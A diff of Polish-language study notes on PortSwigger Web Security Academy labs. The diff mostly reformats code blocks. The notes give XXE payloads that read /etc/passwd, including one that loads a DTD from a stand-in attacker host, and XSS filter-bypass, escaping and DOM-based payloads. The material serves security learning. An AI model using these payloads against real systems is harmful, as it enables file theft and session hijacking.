@@ -37,43 +37,45 @@ Jak to działa (chyba)?
 ## Lab: Exploiting blind XXE to retrieve data via error messages
 1. na naszym serwerze tworzymyh payload:
 ``` 
-	<!ENTITY % file SYSTEM "file:///etc/passwd">
-	<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
-	%eval;
-	%error;
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
 ```	
 - tworzy on referencję do zmiennej (% file), do której załadowujemy zawartość /etc/passwd
 - tworzy referencję do zmiennej (% eval), która dynamicznie tworzy zapytanie do nieistniejącego pliku (którego nazwą jest zawartość pliku /etc/passwd)
 - w "podmiocie" (entity) stworzonym przez wywołanie %eval; tworzymy referencję do zmiennej (%error), która zwróci błąd ponieważ ścieżka nie istnieje
 2. na serwerze dodajemy część kodu z zapytaniem:
-### 
-	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+```
 3. serwer wysyła zapytanie i zwracany jest błąd z nazwą ścieżki, która nie istnieje (bo jest to zawartość pliku /etc/passwd)
 notatka: nie możemy ostatecznego payloadu wpisać od razu, bo blokowane są entity, a w tym payloadzie, który wysyłamy entity tworzy się dopiero na serwerze
 
 
 ## Lab: Exploiting XXE to retrieve data by repurposing a local DTD
 1. poprzez zapytania w typowe miejsca z pikami dtd (Document Type Definition) tj.:
-### 
-	<!DOCTYPE foo [
-	<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
-	%local_dtd;
-	]>
+``` 
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+```
 2. jeśli plik nie istnieje zwracany jest błąd
 3. dowiadujemy się, że w pliku zdefiniowana jest zmienna ISOamso, bo pliki dtd zazwyczaj są opensource
 4. widząc to robimy payload:
-###
-	<!DOCTYPE message [
-	<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
-	<!ENTITY % ISOamso '
-	<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
-	<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
-	&#x25;eval;
-	&#x25;error;
-	'>
-	%local_dtd;
-	]>
-
+```
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
 - tworzy się entity do którego wpisujemy zawartość pliku docbookx.dtd
 - nadpisujemy entity o nazwie ISOamso, dzięki czemu nie zostanie ono zablokowane
 - dalej podobnie jak wcześniej wpisujemy zawartość /etc/passwd, a potem zwracamy błąd z jego zawartością
@@ -86,16 +88,17 @@ Lab: Exploiting XInclude to retrieve files
 1. jest to przypadek, że nie mamy dostępu do całego dokumentu XML, a jedynie podajemy parametry do niego
 2. należy użyć wtedy `XInclude`, który pozwala na budowanie dokumentów XML, z sub-dokumentów
 3. Zamiast parametru podajemy zatem payload (zakodowany URL, zeby mógł być argumentm):
-###
-	<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
 4. Wtedy dosatemy informację: [Invalid product ID: zawartość /etc/passwd]
 
 
 ## Lab: Exploiting XXE via image file upload
 XML w obrazie SVG:
-
-    <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
-
+```
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+```
 # XXS
 
 Lab: Reflected XSS into HTML context with most tags and attributes blocked
@@ -105,73 +108,73 @@ Lab: Reflected XSS into HTML context with most tags and attributes blocked
 4. Enumerujemy po wszyskiech eventach i widzimy, że nie jest blokowany onresize
 5. Teraz należy wysłać payload do ofiary:
 	- konstruujemy iframe, który od razu po załadowaniu zmienia szerokość, a zatem wywołuje onresize
-###
-	<iframe src="https://0aff008804477d86c05a1924003d00c4.web-security-academy.net/?search=<body onresize=print()>" onload=width='200px'>
-
+```
+<iframe src="https://0aff008804477d86c05a1924003d00c4.web-security-academy.net/?search=<body onresize=print()>" onload=width='200px'>
+```
 
 ## Lab: Reflected XSS into HTML context with all tags blocked except custom ones ->> TODO
-
-    <script>
-    location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
-    </script>
-
+```
+<script>
+location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+```
 
 ## Lab: Reflected XSS with some SVG markup allowed
 1. enumerujemy po tagach i eventach
 2. dostępny jest tylko event onbegin i tagi svg, image, title, animatetransform
 3. z tego tworzymy: 
-###
-    <svg><animatetransform onbegin=alert(1)>
-
+```
+<svg><animatetransform onbegin=alert(1)>
+```
 Jeśli jesteśmy wewnątrz skryptu:
-
-	" autofocus onfocus=alert(document.domain) x="
-
+```
+" autofocus onfocus=alert(document.domain) x="
+```
 Jeśli jesteśmy wewnątrz jakiegoś elementu np <img src="[]"...>:
-
-	"><script>alert(document.domain)</script>
-
+```
+"><script>alert(document.domain)</script>
+```
 Jeśli jesteśmy wewnątrz stringa w skrypcie:
-
-	'-alert(document.domain)-'
-	';alert(document.domain)//
-
+```
+'-alert(document.domain)-'
+';alert(document.domain)//
+```
 Jeżeli jest escapowany znak (używany w tym celu backslash) to można dać przed nim \\\\:
 wtedy jeżeli payload jest równy:
-### 
-	\';alert(document.domain)//
-
+``` 
+\';alert(document.domain)//
+```
 po próbie escapowania ' będzie wyglądał tak:
-
-    \\';alert(document.domain)//
-	
+```
+\\';alert(document.domain)//
+```
 a tym samym zamiast escapowania ' zescapowany zostanie backslash, a zatem będzi uznany jako zwykły znak, a nie specjalny.	
 
 Jeżeli escapowany jest również backslash możemy użyć predefiniowanych entity javascripta do znaków np.: \&apos; to ':
-
-	&apos;-alert(document.domain)-&apos;
-
+```
+&apos;-alert(document.domain)-&apos;
+```
 Można również użyć:
-
-	${alert(document.domain)}
-
+```
+${alert(document.domain)}
+```
 # DOM BASED XSS 
 
 Jeżeli wrzucamy do innerHTML nie są akceptowane np. script i svg (nie bedą odpalone):
 - Wtedy użyć można <iframe> ablo <img>
 
 Jeżeli mamy on hashchange to można użyć:
-
-	<iframe src="https://0a15006c031ab25bc000223400ad00a2.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"> 
-
+```
+<iframe src="https://0a15006c031ab25bc000223400ad00a2.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"> 
+```
 jak exploit, albo
-
-	https://0a15006c031ab25bc000223400ad00a2.web-security-academy.net/#<img src=1 onerror=print()>
-
+```
+https://0a15006c031ab25bc000223400ad00a2.web-security-academy.net/#<img src=1 onerror=print()>
+```
 Jeżeli mamy payload do Angulara, to warto sobie poszukać pod konkretny framework:
-
-	{{$on.constructor('alert(1)')()}}
-
+```
+{{$on.constructor('alert(1)')()}}
+```
 
 ## Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
 1. payload wprowadzony jest do wnętrza skryptu, jednak nie możemy "wyjść" ze stringa, bo znak ' jest usuwany
